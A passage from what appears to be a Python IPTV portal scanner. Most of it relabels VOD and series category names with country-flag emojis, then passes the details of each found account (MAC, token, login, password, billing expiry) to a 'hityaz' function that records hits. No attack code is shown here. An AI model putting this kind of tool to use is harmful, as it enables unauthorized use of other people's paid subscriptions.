            vodlist = vodlist.replace("⍟CH", "• |🇨🇭 CH ")
            vodlist = vodlist.replace("⍟SW", "• |🇨🇭 SW ")
            vodlist = vodlist.replace("⍟CL", "• |🇨🇱 CL ")
            vodlist = vodlist.replace("⍟CN", "• |🇨🇳 CN ")
            vodlist = vodlist.replace("⍟CO", "• |🇨🇴 CO ")
            vodlist = vodlist.replace("⍟CR", "• |🇭🇷 CR ")
            vodlist = vodlist.replace("⍟CZ", "• |🇨🇿 CZ ")
            vodlist = vodlist.replace("⍟DE", "• |🇩🇪 DE ")
            vodlist = vodlist.replace("⍟ DE", "• |🇩🇪 DE ")
            vodlist = vodlist.replace("⍟  DE", "• |🇩🇪 DE ")
            vodlist = vodlist.replace("⍟DE|", "• |🇩🇪 DE ")
            vodlist = vodlist.replace("⍟ DE|", "• |🇩🇪 DE ")
            vodlist = vodlist.replace("⍟  DE|", "• |🇩🇪 DE ")
            vodlist = vodlist.replace("⍟[DE", "• |🇩🇪 [DE ")
            vodlist = vodlist.replace("⍟ [DE", "• |🇩🇪 [DE ")
            vodlist = vodlist.replace("⍟De", "• |🇩🇪 De ")
            vodlist = vodlist.replace("⍟ De", "• |🇩🇪 De ")
            vodlist = vodlist.replace("⍟GE", "• |🇩🇪 GE ")
            vodlist = vodlist.replace("⍟ GE", "• |🇩🇪 GE ")
            vodlist = vodlist.replace("⍟DK", "• |🇩🇰 DK ")
            vodlist = vodlist.replace("⍟ DK", "• |🇩🇰 DK ")
            vodlist = vodlist.replace("⍟DM", "• |🇩🇰 DM ")
            vodlist = vodlist.replace("⍟ DM", "• |🇩🇰 DM ")
            vodlist = vodlist.replace("⍟EC", "• |🇪🇨 EC ")
            vodlist = vodlist.replace("⍟EG", "• |🇪🇬 EG ")
            vodlist = vodlist.replace("⍟EN", "• |🇬🇧 EN ")
            vodlist = vodlist.replace("⍟GB", "• |🇬🇧 GB ")
            vodlist = vodlist.replace("⍟UK", "• |🇬🇧 UK ")
            vodlist = vodlist.replace("⍟EU", "• |🇪🇺 EU ")
            vodlist = vodlist.replace("⍟ES", "• |🇪🇸 ES ")
            vodlist = vodlist.replace("⍟SP", "• |🇪🇸 SP ")
            vodlist = vodlist.replace("⍟EX", "• |🇭🇷 EX ")
            vodlist = vodlist.replace("⍟|EX", "•• |🇭🇷 |EX •  ")
            vodlist = vodlist.replace("⍟YU", "• |🇭🇷 YU ")
            vodlist = vodlist.replace("⍟F1", "•  🏎  F1 ")
            vodlist = vodlist.replace("⍟FI", "• |🇫🇮 FI ")
            vodlist = vodlist.replace("⍟FR", "• |🇫🇷 FR ")
            vodlist = vodlist.replace("⍟FI", "• |🇫🇮 FI ")
            vodlist = vodlist.replace("⍟GOR", "• |🇲🇪 GOR ")
            vodlist = vodlist.replace("⍟GR", "• |🇬🇷 GR ")
            vodlist = vodlist.replace("⍟HR", "• |🇭🇷 HR ")
            vodlist = vodlist.replace("⍟HU", "• |🇭🇺 HU ")
            vodlist = vodlist.replace("⍟IE", "• |🇮🇪 IE ")
            vodlist = vodlist.replace("⍟IL", "• |🇮🇪 IL ")
            vodlist = vodlist.replace("⍟IR", "• |🇮🇪 IR ")
            vodlist = vodlist.replace("⍟ID", "• |🇮🇩 ID ")
            vodlist = vodlist.replace("⍟IN", "• |🇮🇳 IN ")
            vodlist = vodlist.replace("⍟IT", "• |🇮🇹 IT ")
            vodlist = vodlist.replace("⍟JP", "• |🇯🇵 JP ")
            vodlist = vodlist.replace("⍟KE", "• |🇰🇪 KE ")
            vodlist = vodlist.replace("⍟KU", "• |🇭🇺 KU ")
            vodlist = vodlist.replace("⍟KR", "• |🇰🇷 KR ")
            vodlist = vodlist.replace("⍟LU", "• |🇱🇺 LU ")
            vodlist = vodlist.replace("⍟MKD", "• |🇲🇰 MKD ")
            vodlist = vodlist.replace("⍟MX", "• |🇲🇽 MX ")
            vodlist = vodlist.replace("⍟MY", "• |🇲🇾 MY ")
            vodlist = vodlist.replace("⍟NETFLIX", "• | 🚩 NETFLIX ")
            vodlist = vodlist.replace("⍟|MULTI", "• | 🚩 |MULTI ")
            vodlist = vodlist.replace("⍟NG", "• |🇳🇬 NG ")
            vodlist = vodlist.replace("⍟NZ", "• |🇳🇿 NZ ")
            vodlist = vodlist.replace("⍟NL", "• |🇳🇱 NL ")
            vodlist = vodlist.replace("⍟NO", "• |🇳🇴 NO ")
            vodlist = vodlist.replace("⍟PA", "• |🇵🇦 PA ")
            vodlist = vodlist.replace("⍟PE", "• |🇵🇪 PE ")
            vodlist = vodlist.replace("⍟PH", "• |🇵🇭 PH ")
            vodlist = vodlist.replace("⍟PK", "• |🇵🇰 PK ")
            vodlist = vodlist.replace("⍟PL", "• |🇵🇱 PL ")
            vodlist = vodlist.replace("⍟PT", "• |🇵🇹 PT ")
            vodlist = vodlist.replace("⍟PPV", "• |🏋🏼‍♂️ PPV ")
            vodlist = vodlist.replace("⍟QA", "• |🇶🇦 QA ")
            vodlist = vodlist.replace("⍟RO", "• |🇷🇴 RO ")
            vodlist = vodlist.replace("⍟RU", "• |🇷🇺 RU ")
            vodlist = vodlist.replace("⍟SA", "• |🇸🇦 SA ")
            vodlist = vodlist.replace("⍟SCREENSAVER", "• | 🏞 SCREENSAVER ")
            vodlist = vodlist.replace("⍟SE", "• |🇸🇪 SE ")
            vodlist = vodlist.replace("⍟SK", "• |🇸🇰 SK ")
            vodlist = vodlist.replace("⍟SL", "• |🇸🇮 SL ")
            vodlist = vodlist.replace("⍟SG", "• |🇸🇬 SG ")
            vodlist = vodlist.replace("⍟SR", "• |🇷🇸 SR ")
            vodlist = vodlist.replace("⍟SU", "• |🇦🇲 SU ")
            vodlist = vodlist.replace("⍟TH", "• |🇹🇭 TH ")
            vodlist = vodlist.replace("⍟TR", "• |🇹🇷 TR ")
            vodlist = vodlist.replace("⍟[TR", "• |🇹🇷 [TR ")
            vodlist = vodlist.replace("⍟TW", "• |🇹🇼 TW ")
            vodlist = vodlist.replace("⍟UKR", "• |🇺🇦 UKR ")
            vodlist = vodlist.replace("⍟US", "• |🇺🇸 US ")
            vodlist = vodlist.replace("⍟VN", "• |🇻🇳 VN ")
            vodlist = vodlist.replace("⍟VIP", "• |⚽️ VIP ")
            vodlist = vodlist.replace("⍟WEB", "• |🏳️‍🌈 WEB ")
            vodlist = vodlist.replace("⍟ZA", "• |🇿🇦 ZA ")
            vodlist = vodlist.replace("⍟AF", "• |🇿🇦 AF ")
            vodlist = vodlist.replace("⍟ADULTS", "• |🔞 ADULTS ")
            vodlist = vodlist.replace("⍟FOR", "• |🔞 FOR ")
            vodlist = vodlist.replace("⍟⋅ FOR", "• |🔞 ⋅ FOR ")
            vodlist = vodlist.replace("⍟BLU", "• |🔞 BLU ")
            vodlist = vodlist.replace("⍟XXX", "• |🔞 XXX ")
            vodlist = vodlist.replace("⍟", "• ⚪️ •")
            listlink = seriesurl
            livel = "⍟"
            serieslist = list(listlink, mac, token, livel)
            serieslist = serieslist.upper()
            serieslist = serieslist.replace("«»", "")
            serieslist = serieslist.replace("⍟AE", "• |🇦🇪 AE ")
            serieslist = serieslist.replace("⍟UAE", "• |🇦🇪 UAE ")
            serieslist = serieslist.replace("⍟ALL", "• |🏁ALL ")
            serieslist = serieslist.replace("⍟ALB", "• |🇦🇱 ALB ")
            serieslist = serieslist.replace("⍟AR", "• |🇸🇦 AR ")
            serieslist = serieslist.replace("⍟ASIA", "• 🈲️ ASIA ")
            serieslist = serieslist.replace("⍟AT", "• |🇦🇹 AT ")
            serieslist = serieslist.replace("⍟AU", "• |🇦🇺 AU ")
            serieslist = serieslist.replace("⍟AZ", "• |🇦🇿 AZ ")
            serieslist = serieslist.replace("⍟BE", "• |🇧🇪 BE ")
            serieslist = serieslist.replace("⍟BG", "• |🇧🇬 BG ")
            serieslist = serieslist.replace("⍟BIH", "• |🇧🇦 BIH ")
            serieslist = serieslist.replace("⍟BO", "• |🇧🇴 BO ")
            serieslist = serieslist.replace("⍟BR", "• |🇧🇷 BR ")
            serieslist = serieslist.replace("⍟CA", "• |🇨🇦 CA ")
            serieslist = serieslist.replace("⍟CH", "• |🇨🇭 CH ")
            serieslist = serieslist.replace("⍟SW", "• |🇨🇭 SW ")
            serieslist = serieslist.replace("⍟CL", "• |🇨🇱 CL ")
            serieslist = serieslist.replace("⍟CN", "• |🇨🇳 CN ")
            serieslist = serieslist.replace("⍟CO", "• |🇨🇴 CO ")
            serieslist = serieslist.replace("⍟CR", "• |🇭🇷 CR ")
            serieslist = serieslist.replace("⍟CZ", "• |🇨🇿 CZ ")
            serieslist = serieslist.replace("⍟DE", "• |🇩🇪 DE ")
            serieslist = serieslist.replace("⍟ DE", "• |🇩🇪 DE ")
            serieslist = serieslist.replace("⍟  DE", "• |🇩🇪 DE ")
            serieslist = serieslist.replace("⍟DE|", "• |🇩🇪 DE ")
            serieslist = serieslist.replace("⍟ DE|", "• |🇩🇪 DE ")
            serieslist = serieslist.replace("⍟  DE|", "• |🇩🇪 DE ")
            serieslist = serieslist.replace("⍟[DE", "• |🇩🇪 [DE ")
            serieslist = serieslist.replace("⍟ [DE", "• |🇩🇪 [DE ")
            serieslist = serieslist.replace("⍟De", "• |🇩🇪 De ")
            serieslist = serieslist.replace("⍟ De", "• |🇩🇪 De ")
            serieslist = serieslist.replace("⍟GE", "• |🇩🇪 GE ")
            serieslist = serieslist.replace("⍟ GE", "• |🇩🇪 GE ")
            serieslist = serieslist.replace("⍟DK", "• |🇩🇰 DK ")
            serieslist = serieslist.replace("⍟ DK", "• |🇩🇰 DK ")
            serieslist = serieslist.replace("⍟DM", "• |🇩🇰 DM ")
            serieslist = serieslist.replace("⍟ DM", "• |🇩🇰 DM ")
            serieslist = serieslist.replace("⍟EC", "• |🇪🇨 EC ")
            serieslist = serieslist.replace("⍟EG", "• |🇪🇬 EG ")
            serieslist = serieslist.replace("⍟EN", "• |🇬🇧 EN ")
            serieslist = serieslist.replace("⍟GB", "• |🇬🇧 GB ")
            serieslist = serieslist.replace("⍟UK", "• |🇬🇧 UK ")
            serieslist = serieslist.replace("⍟EU", "• |🇪🇺 EU ")
            serieslist = serieslist.replace("⍟ES", "• |🇪🇸 ES ")
            serieslist = serieslist.replace("⍟SP", "• |🇪🇸 SP ")
            serieslist = serieslist.replace("⍟EX", "• |🇭🇷 EX ")
            serieslist = serieslist.replace("⍟|EX", "• |🇭🇷 |EX ")
            serieslist = serieslist.replace("⍟YU", "• |🇭🇷 YU ")
            serieslist = serieslist.replace("⍟F1", "•  🏎  F1 ")
            serieslist = serieslist.replace("⍟FI", "• |🇫🇮 FI ")
            serieslist = serieslist.replace("⍟FR", "• |🇫🇷 FR ")
            serieslist = serieslist.replace("⍟FI", "• |🇫🇮 FI ")
            serieslist = serieslist.replace("⍟GOR", "• |🇲🇪 GOR ")
            serieslist = serieslist.replace("⍟GR", "• |🇬🇷 GR ")
            serieslist = serieslist.replace("⍟HR", "• |🇭🇷 HR ")
            serieslist = serieslist.replace("⍟HU", "• |🇭🇺 HU ")
            serieslist = serieslist.replace("⍟IE", "• |🇮🇪 IE ")
            serieslist = serieslist.replace("⍟IL", "• |🇮🇪 IL ")
            serieslist = serieslist.replace("⍟IR", "• |🇮🇪 IR ")
            serieslist = serieslist.replace("⍟ID", "• |🇮🇩 ID ")
            serieslist = serieslist.replace("⍟IN", "• |🇮🇳 IN ")
            serieslist = serieslist.replace("⍟IT", "• |🇮🇹 IT ")
            serieslist = serieslist.replace("⍟JP", "• |🇯🇵 JP ")
            serieslist = serieslist.replace("⍟KE", "• |🇰🇪 KE ")
            serieslist = serieslist.replace("⍟KU", "• |🇭🇺 KU ")
            serieslist = serieslist.replace("⍟KR", "• |🇰🇷 KR ")
            serieslist = serieslist.replace("⍟LU", "• |🇱🇺 LU ")
            serieslist = serieslist.replace("⍟MKD", "• |🇲🇰 MKD ")
            serieslist = serieslist.replace("⍟MX", "• |🇲🇽 MX ")
            serieslist = serieslist.replace("⍟MY", "• |🇲🇾 MY ")
            serieslist = serieslist.replace("⍟NETFLIX", "• | 🚩 NETFLIX ")
            serieslist = serieslist.replace("⍟|MULTI", "• | 🚩 |MULTI ")
            serieslist = serieslist.replace("⍟NG", "• |🇳🇬 NG ")
            serieslist = serieslist.replace("⍟NZ", "• |🇳🇿 NZ ")
            serieslist = serieslist.replace("⍟NL", "• |🇳🇱 NL ")
            serieslist = serieslist.replace("⍟NO", "• |🇳🇴 NO ")
            serieslist = serieslist.replace("⍟PA", "• |🇵🇦 PA ")
            serieslist = serieslist.replace("⍟PE", "• |🇵🇪 PE ")
            serieslist = serieslist.replace("⍟PH", "• |🇵🇭 PH ")
            serieslist = serieslist.replace("⍟PK", "• |🇵🇰 PK ")
            serieslist = serieslist.replace("⍟PL", "• |🇵🇱 PL ")
            serieslist = serieslist.replace("⍟PT", "• |🇵🇹 PT ")
            serieslist = serieslist.replace("⍟PPV", "• |🏋🏼‍♂️ PPV ")
            serieslist = serieslist.replace("⍟QA", "• |🇶🇦 QA ")
            serieslist = serieslist.replace("⍟RO", "• |🇷🇴 RO ")
            serieslist = serieslist.replace("⍟RU", "• |🇷🇺 RU ")
            serieslist = serieslist.replace("⍟SA", "• |🇸🇦 SA ")
            serieslist = serieslist.replace("⍟SCREENSAVER", "• | 🏞 SCREENSAVER ")
            serieslist = serieslist.replace("⍟SE", "• |🇸🇪 SE ")
            serieslist = serieslist.replace("⍟SK", "• |🇸🇰 SK ")
            serieslist = serieslist.replace("⍟SL", "• |🇸🇮 SL ")
            serieslist = serieslist.replace("⍟SG", "• |🇸🇬 SG ")
            serieslist = serieslist.replace("⍟SR", "• |🇷🇸 SR ")
            serieslist = serieslist.replace("⍟SU", "• |🇦🇲 SU ")
            serieslist = serieslist.replace("⍟TH", "• |🇹🇭 TH ")
            serieslist = serieslist.replace("⍟TR", "• |🇹🇷 TR ")
            serieslist = serieslist.replace("⍟[TR", "• |🇹🇷 [TR ")
            serieslist = serieslist.replace("⍟TW", "• |🇹🇼 TW ")
            serieslist = serieslist.replace("⍟UKR", "• |🇺🇦 UKR ")
            serieslist = serieslist.replace("⍟US", "• |🇺🇸 US ")
            serieslist = serieslist.replace("⍟VN", "• |🇻🇳 VN ")
            serieslist = serieslist.replace("⍟VIP", "• |⚽️ VIP ")
            serieslist = serieslist.replace("⍟WEB", "• |🏳️‍🌈 WEB ")
            serieslist = serieslist.replace("⍟ZA", "• |🇿🇦 ZA ")
            serieslist = serieslist.replace("⍟AF", "• |🇿🇦 AF ")
            serieslist = serieslist.replace("⍟ADULTS", "• |🔞 ADULTS ")
            serieslist = serieslist.replace("⍟FOR", "• |🔞 FOR ")
            serieslist = serieslist.replace("⍟⋅ FOR", "• |🔞 ⋅ FOR ")
            serieslist = serieslist.replace("⍟BLU", "• |🔞 BLU ")
            serieslist = serieslist.replace("⍟XXX", "• |🔞 XXX ")
            serieslist = serieslist.replace("⍟", "• 🔴 •")
        hityaz(
            mac,
            trh,
            real,
            m3ulink,
            m3uimage,
            durum,
            vpn,
            kanalsayisi,
            filmsayisi,
            dizisayisi,
            livelist,
            vodlist,
            serieslist,
            playerapi,
            fname,
            tariff_plan,
            ls,
            login,
            password,
            tariff_plan_id,
            bill,
            expire_billing_date,
            max_online,
            parent_password,
            stb_type,
            comment,
            country,
            settings_password,
            adult,
            scountry,
            country_name,
        )


if stop == 2:
    option.close()
    XD.close()
    sys.exit()
    quit()
else:
    run(STBbots)

